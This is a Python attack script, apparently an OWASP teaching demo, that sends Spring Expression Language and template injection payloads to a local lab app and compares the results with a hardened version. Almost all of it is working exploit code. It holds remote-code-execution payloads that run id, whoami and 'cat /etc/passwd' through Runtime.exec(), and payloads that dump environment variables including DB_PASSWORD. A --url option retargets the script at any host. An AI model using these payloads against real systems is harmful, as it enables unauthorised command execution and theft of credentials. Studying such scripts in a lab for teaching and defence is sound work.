#!/usr/bin/env python3
"""
OWASP A03:2021 - Expression Language Injection Attack Script
=============================================================

表達式語言注入攻擊展示：
1. Spring EL (SpEL) Injection
2. Server-Side Template Injection (SSTI)
3. Remote Code Execution (RCE) via SpEL

CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement
https://cwe.mitre.org/data/definitions/917.html

Author: OWASP Demo
"""

import requests
import argparse
import json
import base64

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗██████╗ ███████╗██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
║  ██╔════╝██╔══██╗██╔════╝██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
║  ███████╗██████╔╝█████╗  ██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ║
║  ╚════██║██╔═══╝ ██╔══╝  ██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ║
║  ███████║██║     ███████╗███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ║
║  ╚══════╝╚═╝     ╚══════╝╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ║
║                                                                             ║
║  OWASP A03:2021 - Expression Language Injection Attack Script              ║
║  CWE-917: Expression Language Injection                                     ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def basic_spel_injection(base_url):
    """基本 SpEL 注入測試"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Basic SpEL Injection - 基本表達式注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/template/eval{RESET}")
    print(f"{YELLOW}攻擊原理: 直接執行用戶提供的 SpEL 表達式{RESET}")
    
    payloads = [
        ("1 + 1", "基本算術"),
        ("'Hello' + ' ' + 'World'", "字串串接"),
        ("T(java.lang.Math).random()", "呼叫靜態方法"),
        ("T(java.lang.System).currentTimeMillis()", "取得系統時間"),
        ("T(java.lang.Runtime).getRuntime().availableProcessors()", "取得 CPU 核心數"),
    ]
    
    for expr, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Expression: {expr}")
        
        try:
            response = requests.get(
                f"{base_url}/api/template/eval",
                params={"expression": expr},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                result = data.get("result", "N/A")
                result_type = data.get("type", "N/A")
                
                print(f"{GREEN}    [SUCCESS] ✓ 執行成功{RESET}")
                print(f"    Result: {result}")
                print(f"    Type: {result_type}")
            else:
                data = response.json()
                print(f"{RED}    [-] 錯誤: {data.get('error', 'Unknown')}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def rce_spel_injection(base_url):
    """Remote Code Execution via SpEL"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] RCE via SpEL - 遠端程式碼執行{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/template/eval{RESET}")
    print(f"{YELLOW}攻擊原理: 透過 Runtime.exec() 執行系統命令{RESET}")
    
    # 有輸出的 RCE payload
    rce_payloads = [
        # 使用 Scanner 讀取命令輸出
        (
            "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()",
            "執行 id 命令"
        ),
        (
            "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\\\A').next()",
            "執行 whoami 命令"
        ),
        (
            "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('uname -a').getInputStream()).useDelimiter('\\\\A').next()",
            "執行 uname -a 命令"
        ),
        (
            "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\\\A').next()",
            "讀取 /etc/passwd"
        ),
    ]
    
    for expr, description in rce_payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Expression: {expr[:80]}...")
        
        try:
            response = requests.get(
                f"{base_url}/api/template/eval",
                params={"expression": expr},
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                result = data.get("result", "")
                
                if result and result != "null":
                    print(f"{GREEN}    [SUCCESS] ✓ RCE 成功！{RESET}")
                    print(f"\n    {YELLOW}命令輸出:{RESET}")
                    for line in result.split('\n')[:10]:
                        print(f"    {line}")
                    if result.count('\n') > 10:
                        print(f"    ... (還有 {result.count(chr(10)) - 10} 行)")
                else:
                    print(f"{YELLOW}    [?] 命令執行但無輸出{RESET}")
            else:
                data = response.json()
                print(f"{RED}    [-] 錯誤: {data.get('error', 'Unknown')}{RESET}")
                detail = data.get("detail", "")
                if detail:
                    print(f"    Detail: {detail[:100]}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def env_extraction(base_url):
    """環境變數提取"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Environment Variable Extraction - 環境變數提取{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/template/eval{RESET}")
    
    payloads = [
        ("T(java.lang.System).getenv()", "取得所有環境變數"),
        ("T(java.lang.System).getenv('PATH')", "取得 PATH"),
        ("T(java.lang.System).getenv('HOME')", "取得 HOME"),
        ("T(java.lang.System).getenv('DB_PASSWORD')", "取得資料庫密碼"),
        ("T(java.lang.System).getProperty('user.dir')", "取得工作目錄"),
        ("T(java.lang.System).getProperty('java.version')", "取得 Java 版本"),
    ]
    
    extracted = {}
    
    for expr, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        
        try:
            response = requests.get(
                f"{base_url}/api/template/eval",
                params={"expression": expr},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                result = data.get("result", "null")
                
                if result and result != "null":
                    print(f"{GREEN}    [+] {result[:200]}{RESET}")
                    extracted[description] = result
                else:
                    print(f"{YELLOW}    [?] 無結果{RESET}")
            else:
                print(f"{RED}    [-] 失敗{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")
    
    if extracted:
        print(f"\n{GREEN}[SUMMARY] 成功提取的資訊:{RESET}")
        for key, value in extracted.items():
            print(f"  - {key}: {value[:100]}")


def template_injection(base_url):
    """Server-Side Template Injection"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Template Injection - 模板注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/template/render{RESET}")
    print(f"{YELLOW}攻擊原理: 在模板中注入 SpEL 表達式{RESET}")
    
    test_cases = [
        {
            "template": "Hello, #{name}!",
            "variables": {"name": "World"},
            "description": "正常使用"
        },
        {
            "template": "Result: #{7*7}",
            "variables": {},
            "description": "算術表達式注入"
        },
        {
            "template": "User: #{T(java.lang.System).getProperty('user.name')}",
            "variables": {},
            "description": "系統資訊提取"
        },
        {
            "template": "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "variables": {},
            "description": "RCE 嘗試"
        },
        {
            "template": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\\\A').next()}",
            "variables": {},
            "description": "RCE with output"
        },
    ]
    
    for test in test_cases:
        print(f"\n{BLUE}[*] {test['description']}{RESET}")
        print(f"    Template: {test['template'][:60]}...")
        
        try:
            response = requests.post(
                f"{base_url}/api/template/render",
                json=test,
                headers={"Content-Type": "application/json"},
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                rendered = data.get("rendered", "")
                
                if "id=" in rendered or "uid=" in rendered or any(c.isdigit() for c in rendered):
                    print(f"{GREEN}    [SUCCESS] ✓ 模板注入成功{RESET}")
                    print(f"    Rendered: {rendered}")
                else:
                    print(f"{YELLOW}    [?] Rendered: {rendered}{RESET}")
            else:
                data = response.json()
                print(f"{RED}    [-] 錯誤: {data.get('error', 'Unknown')}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def property_access(base_url):
    """動態屬性存取攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] Property Access Attack - 動態屬性存取{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/template/property{RESET}")
    
    paths = [
        ("T(java.lang.System).getenv()", "環境變數"),
        ("T(java.lang.Runtime).getRuntime()", "Runtime 物件"),
        ("T(java.lang.Class).forName('java.lang.Runtime')", "反射載入類別"),
        ("T(java.io.File).listRoots()", "列出根目錄"),
    ]
    
    for path, description in paths:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Path: {path}")
        
        try:
            response = requests.get(
                f"{base_url}/api/template/property",
                params={"path": path},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                value = data.get("value", "")
                print(f"{GREEN}    [+] Value: {value[:200]}{RESET}")
            else:
                data = response.json()
                print(f"{RED}    [-] 錯誤: {data.get('error', 'Unknown')}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def format_injection(base_url):
    """Format 函數注入"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[6] Format Function Injection - 格式化函數注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/template/format{RESET}")
    
    test_cases = [
        {
            "format": "Hello, %s!",
            "args": ["World"],
            "description": "正常使用"
        },
        {
            "format": "Result: %s",
            "args": ["T(java.lang.Runtime).getRuntime().exec('id')"],
            "description": "SpEL in args"
        },
        {
            "format": "Version: %s",
            "args": ["T(java.lang.System).getProperty('java.version')"],
            "description": "取得 Java 版本"
        },
    ]
    
    for test in test_cases:
        print(f"\n{BLUE}[*] {test['description']}{RESET}")
        print(f"    Format: {test['format']}")
        print(f"    Args: {test['args']}")
        
        try:
            response = requests.post(
                f"{base_url}/api/template/format",
                json=test,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                result = data.get("result", "")
                print(f"{GREEN}    [+] Result: {result}{RESET}")
            else:
                data = response.json()
                print(f"{RED}    [-] 錯誤: {data.get('error', 'Unknown')}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    test_cases = [
        {
            "name": "SpEL 表達式執行",
            "endpoint": "/api/template/eval",
            "method": "GET",
            "params": {"expression": "T(java.lang.Runtime).getRuntime().availableProcessors()"},
        },
        {
            "name": "RCE via SpEL",
            "endpoint": "/api/template/eval",
            "method": "GET",
            "params": {"expression": "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()"},
        },
        {
            "name": "模板注入",
            "endpoint": "/api/template/render",
            "method": "POST",
            "data": {"template": "#{T(java.lang.System).getenv()}", "variables": {}},
        },
        {
            "name": "動態屬性存取",
            "endpoint": "/api/template/property",
            "method": "GET",
            "params": {"path": "T(java.lang.System).getenv()"},
        },
    ]
    
    for test in test_cases:
        print(f"\n{YELLOW}測試: {test['name']}{RESET}")
        print(f"端點: {test['endpoint']}")
        
        for name, url in [("漏洞版本", VULNERABLE_URL), ("安全版本", SECURE_URL)]:
            try:
                if test["method"] == "POST":
                    response = requests.post(
                        f"{url}{test['endpoint']}",
                        json=test.get("data"),
                        headers={"Content-Type": "application/json"},
                        timeout=10
                    )
                else:
                    response = requests.get(
                        f"{url}{test['endpoint']}",
                        params=test.get("params"),
                        timeout=10
                    )
                
                status = response.status_code
                
                # 嘗試解析 JSON，如果失敗則使用原始文字
                try:
                    data = response.json()
                except:
                    data = {"raw": response.text[:100]}
                
                if name == "漏洞版本":
                    if status == 200 and data.get("result") not in [None, "null", ""]:
                        result = str(data.get("result", ""))[:50]
                        print(f"  {RED}✗ {name}: {status} - 攻擊成功 ({result}...){RESET}")
                    else:
                        print(f"  {YELLOW}? {name}: {status}{RESET}")
                else:
                    if status == 400:
                        error_msg = data.get('error', data.get('message', 'Blocked'))
                        print(f"  {GREEN}✓ {name}: {status} - 輸入驗證阻擋 ({error_msg}){RESET}")
                    elif status == 403:
                        print(f"  {GREEN}✓ {name}: {status} - 功能已禁用{RESET}")
                    elif status == 200:
                        # 安全版本可能只允許安全操作
                        result = data.get('result', data.get('rendered', ''))
                        print(f"  {GREEN}✓ {name}: {status} - 安全處理 ({str(result)[:30]}){RESET}")
                    else:
                        print(f"  {YELLOW}? {name}: {status} - {data.get('error', 'Unknown')}{RESET}")
                    
            except requests.exceptions.RequestException as e:
                print(f"  {RED}✗ {name}: 連線錯誤 - {str(e)}{RESET}")
            except Exception as e:
                print(f"  {RED}✗ {name}: 錯誤 - {str(e)}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="Expression Language Injection Attack Script for OWASP A03 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 expression_injection.py --basic         # 基本 SpEL 注入
  python3 expression_injection.py --rce           # RCE via SpEL
  python3 expression_injection.py --env           # 環境變數提取
  python3 expression_injection.py --template      # 模板注入
  python3 expression_injection.py --property      # 動態屬性存取
  python3 expression_injection.py --format        # Format 函數注入
  python3 expression_injection.py --compare       # 比較安全/漏洞版本
  python3 expression_injection.py --all           # 執行所有攻擊
        """
    )
    
    parser.add_argument("--basic", action="store_true", help="基本 SpEL 注入")
    parser.add_argument("--rce", action="store_true", help="RCE via SpEL")
    parser.add_argument("--env", action="store_true", help="環境變數提取")
    parser.add_argument("--template", action="store_true", help="模板注入")
    parser.add_argument("--property", action="store_true", help="動態屬性存取")
    parser.add_argument("--format", action="store_true", help="Format 函數注入")
    parser.add_argument("--compare", action="store_true", help="比較安全/漏洞版本")
    parser.add_argument("--all", action="store_true", help="執行所有攻擊")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if not any([args.basic, args.rce, args.env, args.template, 
                args.property, args.format, args.compare, args.all]):
        parser.print_help()
        return
    
    url = args.url
    
    if args.all:
        basic_spel_injection(url)
        rce_spel_injection(url)
        env_extraction(url)
        template_injection(url)
        property_access(url)
        format_injection(url)
    else:
        if args.basic:
            basic_spel_injection(url)
        if args.rce:
            rce_spel_injection(url)
        if args.env:
            env_extraction(url)
        if args.template:
            template_injection(url)
        if args.property:
            property_access(url)
        if args.format:
            format_injection(url)
    
    if args.compare:
        compare_vulnerability()
    
    print(f"\n{GREEN}[*] Expression Language Injection 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
